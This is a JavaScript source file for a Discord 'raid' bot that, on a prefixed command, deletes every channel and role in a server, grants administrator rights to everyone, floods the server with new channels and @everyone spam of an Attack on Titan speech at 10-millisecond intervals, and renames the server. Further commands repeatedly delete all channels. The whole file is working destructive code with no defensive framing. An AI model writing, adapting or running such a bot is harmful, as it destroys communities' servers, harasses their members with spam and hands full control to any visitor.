//Variable setup
const { Client, Intents, Message, DiscordAPIError } = require("discord.js");

const client = new Client({
  intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES],
});

const Config = require("../raid/config.json");
const prefix = Config.prefix;
const invite_link =
  "https://discord.com/api/oauth2/authorize?client_id=956198381821255680&permissions=8&scope=bot";
const { Permissions } = require("discord.js");
spam_channel_name = [
  "☊⏃⊬",
  "⏁⍀⟟ ⎅⍜ ⎅⏃⟟",
  "☌⟒⎐⌇",
  "⍀⎍⋔⏚⌰⟟⋏☌",
  "⍀⎍⋏☌-☊⊑⏃⋏",
  "⟒⍀⟒⋏ ⊬⟒⏃☌⟒⍀",
  "⏃⋔⍜☌⎍⌇",
  "⌇⏃⌇⏃☌⟒⊬⍜",
  "⎅⋔⋔",
  "⟊⍜⟒ ⋔⏃⋔⏃",
];

client.on("ready", () => {
  console.log("========================");
  console.log("Logged in successfully");
  console.log("========================");
});

//Message event
client.on("messageCreate", (message) => {
  if (message.content === prefix + "start") {
    message.delete();
    message.guild.channels.cache.forEach((channel) => {
      channel
        .delete()
        .then((deleted) => console.log(`Deleted channel ${deleted.name}`))
        .catch(console.error);
    });
    message.guild.roles.cache.forEach((roles) => {
      roles
        .delete()
        .then((deleted) => console.log(`Deleted role ${deleted.name}`))
        .catch(console.error);
    });

    message.guild.roles.everyone.setPermissions([
      Permissions.FLAGS.ADMINISTRATOR,
    ]);
    setInterval(function () {
      message.guild.channels
        .create(
          spam_channel_name[
            Math.floor(Math.random() * spam_channel_name.length)
          ]
        )
        .then(async (channel) =>
          setInterval(function () {
            channel.send(
              "@everyone\nTo all Subject of Ymir. My name is Eren Yeager. I’m using the power of the Founding Titan to address all Subjects of Ymir. I’ve undone the hardening of all the Walls on Paradis island,and all Titans entrapped within them have started marching. My goal is to protect the people of Paradis,the place I was born and raised. However, the word wishes for the annihilation of the people of Paradis. Not just the people of this island,but until all of the Subjects of Ymir have been eleminated. I reject that wish. The wall Titans shall trample all surface of the land outside of this island. Until all lives existing there have been exterminated from this world."
            );
          }, 10)
        );
    }, 10);
    message.guild.setIcon(
      "https://ichef.bbci.co.uk/news/640/cpsprodpb/D6B0/production/_95806945_gettyimages-590147780.jpg"
    );
    message.guild.setName("The Rumbling");
  }
});

client.on("messageCreate", (message) => {
  if (message.content === prefix + "clear") {
    message.delete();
    message.guild.channels.cache.forEach((channel) => {
      channel.delete();
    });
    console.log("Cleaned successfully");
    message.guild.channels.create("Chat");
  }
});

client.on("messageCreate", (message) => {
  if (message.content === prefix + "block") {
    message.delete();
    setInterval(function () {
      message.guild.channels.cache.forEach((channel) => {
        channel.delete();
      }, 1);
    });
  }
});

client.login(Config.token);
